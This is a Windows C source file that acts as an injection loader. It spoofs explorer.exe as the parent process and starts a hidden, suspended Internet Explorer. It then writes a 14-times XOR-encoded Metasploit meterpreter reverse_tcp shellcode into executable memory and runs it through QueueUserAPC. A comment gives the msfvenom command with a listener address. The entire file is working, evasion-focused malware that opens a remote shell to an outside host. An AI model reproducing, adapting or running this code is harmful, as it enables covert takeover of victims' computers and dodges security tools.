#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>


DWORD FindExplorerPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

int main() {

    //msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/xor_dynamic -i 14 LHOST=192.168.0.109 EXITFUNC=thread -f
    unsigned char shellcode[] = ("\xeb\x27\x5b\x53\x5f\xb0\x74\xfc\xae\x75\xfd\x57\x59\x53\x5e"
"\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\x32\x3a"
"\x74\x07\x80\x3e\x74\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff"
"\xff\x3c\x03\x1a\x74\xd7\x24\x41\x6f\x5c\xaa\x3e\xff\xb4\x49"
"\xfe\x4d\x65\x50\x44\xb6\x05\x2a\x3b\x4b\xe5\xfb\x4b\xe5\xfa"
"\x65\x9b\x03\x46\x25\x48\x04\x9a\x02\x01\x6f\xd6\xe8\xfc\xc3"
"\xe2\xf2\xe8\xfc\xe5\xc3\x19\x26\x3f\x01\xeb\x27\x5b\x53\x5f"
"\xb0\x2f\xfc\xae\x75\xfd\x57\x59\x53\x5e\x8a\x06\x30\x07\x48"
"\xff\xc7\x48\xff\xc6\x66\x81\x3f\xc8\x05\x74\x07\x80\x3e\x2f"
"\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff\xff\x03\x1a\x0b\x2f"
"\xe8\x3d\x50\x50\x45\xbb\xb5\xe6\xa5\x76\xe7\x5c\x5a\x49\x55"
"\x89\x1c\x3b\x04\x52\xf4\xc4\x52\xf4\xc5\x7c\x8a\x3c\xf7\x5e"
"\x77\x1d\x8b\x3d\xac\x7e\xe9\xf1\xed\xfc\xfb\xe3\xd7\xe5\xf4"
"\xfc\x2d\x08\x19\xac\xd7\x27\x5b\x6f\x5f\xb0\x51\xfc\xae\x49"
"\xfd\x57\x65\x53\x5e\xb6\x06\x30\x3b\x48\xff\xfb\x48\xff\xfa"
"\x66\x81\x03\xf5\xa8\x48\x07\x80\x02\x6d\x75\xd6\xeb\xe6\xc3"
"\xe1\xe8\xe8\xff\xff\xc3\x1a\x0e\x3f\x6d\xf1\x15\x58\x49\x6d"
"\xb3\x6c\xce\xad\x6f\xcf\x54\x43\x61\x5d\x90\x34\x33\x1d\x7a"
"\xfc\xdd\x7a\xfc\xdc\x54\x82\x25\xaa\xb2\x6e\x35\x83\x24\x44"
"\x76\xf0\xd9\xe5\xe5\xd3\xeb\xce\xcd\xfc\xe5\x23\x20\x0b\x44"
"\xf9\x1e\x78\x41\x66\x93\x17\xc5\x8d\x67\xc4\x74\x4b\x6a\x7d"
"\x98\x3f\x13\x15\x71\xdc\xd5\x71\xdc\xd4\x5f\xa2\x2d\xca\x1d"
"\x66\x3e\xa3\x2c\x3c\x56\xf8\xd2\xc5\xed\xd8\xcb\xc6\xc6\xdc"
"\xed\x37\x22\x17\xdc\x05\x47\x6b\x72\xa3\x31\xde\xb2\x4d\xd0"
"\x44\x6e\x71\x42\xb2\x2b\x23\x30\x6a\xe3\xff\x65\xec\xf1\x44"
"\x9d\x07\xd3\xd7\x43\x25\x9c\x06\x2b\x66\xdd\xc9\xfa\xc7\xcc"
"\xfb\xe3\xdd\xe3\xc7\x2c\x1d\x31\xc8\x35\x62\x70\x4d\x89\xc6"
"\xee\x97\x56\xef\x6e\x7a\x41\x67\xa9\x14\x09\x24\x5a\xc6\xe4"
"\x5a\xc6\xe5\x74\xb8\x1c\xbc\x8e\x57\x15\xb9\x1d\xf7\x4c\xc9"
"\xf9\xdf\xdc\xf3\xd1\xf7\xed\xc6\xdc\x1c\x38\xc6\xf7\x1f\x76"
"\x40\x68\x92\x49\xc4\x83\x66\xca\x75\x45\x6b\x73\x99\x31\x12"
"\x1b\x70\xd2\xd4\x7f\xdd\xda\x5e\xac\x2c\xba\x8a\x68\x3f\xad"
"\x2d\x62\x57\xf6\xd3\xcb\xec\xd6\xca\xc8\xc7\xd2\xec\x36\x2c"
"\x49\xd2\x04\x49\x6a\x7c\xa2\xb4\xdf\xbc\x4c\xde\x45\x60\x70"
"\x4c\xb3\x25\x22\x3e\x6b\xed\xfe\x6b\xed\xff\x45\x93\x06\x5a"
"\x53\x4d\x24\x92\x07\xae\x67\xd3\xc8\xf4\xc6\xc2\xfa\xed\xdc"
"\xed\xc6\x2d\x13\xb4\xc6\x34\x6c\x71\x43\x88\x17\xef\x99\x57"
"\xe1\x6f\x74\x40\x69\xa8\x1a\x08\x2a\x5b\xc8\xe5\x54\xc7\xeb"
"\x75\xb6\x1d\xb9\x69\x59\x14\xb7\x1c\x26\x4d\xc7\xf8\xd1\xdd"
"\xfd\xd0\xf9\xec\xc8\xdd\x1d\x2a\x17\xf9\x02\x78\x5d\x66\x8f"
"\x10\xd9\x8d\x7b\xc4\x68\x4b\x76\x7d\x84\x3f\x0f\x15\x6d\xdc"
"\xc9\x71\xc0\xd4\x43\xa2\x31\x9b\xd8\x66\x22\xa3\x30\x3b\x4a"
"\xf8\xce\xc5\xf1\xd8\xd7\xc6\xda\xdc\xf1\x1d\x3d\xdd\x26\x5c"
"\x79\x42\xab\xa3\xfd\xa9\x5f\xe0\x4c\x6f\x52\x59\xa0\x1b\x2b"
"\x31\x49\xf8\xed\x55\xe4\xf0\x67\x86\x15\x31\xe4\x42\x06\x87"
"\x14\x88\x6e\xdc\xea\xe1\xd5\xfc\xf3\xe2\xfe\xf8\xd5\x0e\x8e"
"\xd9\x5a\x97\xdd\xfe\xe0\xe9\x12\x14\x39\x4f\x59\x64\x42\x46"
"\x68\x58\x40\x14\xc0\x71\x71\x85\x5a\x45\x5a\x9f\x6b\x16\x40"
"\xae\x40\x34\x71\x85\x7a\x75\x5a\x1b\x8e\x44\x42\x68\x23\xdd"
"\x71\x3f\xc8\x89\x2e\x75\x45\x0c\x24\x05\x53\xd5\xf0\x03\x49"
"\x24\xd3\xf6\xd4\x5c\x49\x74\x5a\x9f\x6b\x2e\x83\x67\x2e\x5c"
"\x38\xde\x6e\xa4\x6a\x0c\x32\x0c\x07\xa0\x60\x14\x39\x0e\x83"
"\xa5\x9a\x14\x39\x0e\x40\xa0\xd2\x60\x5e\x46\x09\xf5\x42\x9f"
"\x71\x16\x4c\xae\x52\x34\x70\x0f\xd8\xc6\x44\x5c\xc6\xc7\x49"
"\xae\x26\x9c\x71\x0f\xde\x68\x23\xdd\x71\x3f\xc8\x89\x53\xd5"
"\xf0\x03\x49\x24\xd3\x2c\xd9\x7b\xf9\x69\x11\x58\x1d\x06\x4d"
"\x1c\xc3\x61\xe1\x56\x4c\xae\x52\x30\x70\x0f\xd8\x43\x53\x9f"
"\x35\x46\x4c\xae\x52\x08\x70\x0f\xd8\x64\x99\x10\xb1\x46\x09"
"\xf5\x53\x4c\x78\x56\x56\x7c\x48\x55\x61\x4f\x51\x64\x48\x5c"
"\xba\xe2\x28\x64\x40\xeb\xd9\x56\x49\x7c\x48\x5c\xb2\x1c\xe1"
"\x6e\xed\xeb\xc6\x53\x41\x9b\x65\x67\x0b\x51\x3b\x17\x12\x14"
"\x78\x58\x41\xac\xf4\x5c\xb8\xe2\xa8\x24\x12\x14\x70\x87\xed"
"\x6c\xae\x16\x39\x1f\x54\xe5\xba\x14\x5c\x4f\x5c\x6c\x9b\xf0"
"\x75\x87\xf9\x64\xa8\x58\x4e\x28\x0f\xda\xc7\x58\xb0\xe4\x60"
"\x24\x13\x14\x39\x57\x49\x9f\x3b\x94\x52\x0e\xf7\xf0\x78\x1e"
"\x78\x50\x58\x75\x5f\x25\xf0\x43\x39\xe5\x5a\xeb\xf9\x46\x81"
"\xe7\x5a\xeb\xf9\x46\x81\xe4\x53\xae\xd3\x01\xd7\xc5\xed\xc1"
"\x71\x87\xcf\x4f\x02\x55\x61\x42\x81\xc7\x5a\x9d\xc0\x4f\xb2"
"\xbc\xb7\x60\x58\xf1\xdd\xa0\xd2\x60\x33\x47\xf7\xeb\x67\xf1"
"\xd1\x9d\x08\x25\x12\x5c\xba\xe2\x18\x6d\x9b\xf6\x74\x3f\xc1"
"\x4f\x16\x55\x61\x46\x81\xdc\x53\xae\x3b\xd7\xc0\x7a\xed\xc1"
"\xba\xf6\x08\x5b\x47\x5c\xba\xca\x28\x7b\x9b\xe2\x53\x4e\x49"
"\x7c\x7a\x14\x29\x0e\x08\x64\x4a\x5c\xb0\xfc\x40\x14\xdb\x55"
"\x83\x56\xac\x76\xf7\xeb\xec\x46\x81\xe6\x5b\x9d\xfe\x43\x39"
"\xec\x5b\x9d\xc9\x46\x81\xff\x5a\x9d\xc0\x4f\xb2\x27\xcb\xdc"
"\x66\xf1\xdd\xa6\xea\x14\x44\x26\x50\x64\x45\x4d\x51\x0e\x48"
"\x25\x12\x55\x61\x64\x08\x7f\x53\xae\x32\x21\x07\x15\xed\xc1"
"\x6e\x57\x49\x9f\x67\x7a\x74\x6f\xf7\xf0\x5b\xeb\xf7\xe7\x34"
"\xda\xed\xeb\x71\x0f\xcb\x6d\x3b\xd2\x71\x8b\xfe\x50\xa6\x55"
"\xc6\xe9\x50\x4f\x12\x4d\x82\xee\x15\x0f\x18\x55\xb0\xd4\xf7"
"\xf0\x2d\xf8\xac\xde\x88\x42\x40\x62\x91\x90\x8d\xa5\xc9\xe6"
"\xe1\x07\xaa\xb2\xf5\x94\xee\x4f\xc8\x05\x5f\x03\x32\x3a");


    STARTUPINFOEXA siex;
    PROCESS_INFORMATION piex;
    SIZE_T sizeT;
    siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, FindExplorerPID());

    InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &sizeT);
    UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
    

    CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&siex, &piex);

    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(piex.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(piex.hProcess, lpBaseAddress, (LPVOID)shellcode, sizeof(shellcode), NULL);
    QueueUserAPC((PAPCFUNC)lpBaseAddress, piex.hThread, NULL);
    ResumeThread(piex.hThread);
    CloseHandle(piex.hThread);

    return 0;
}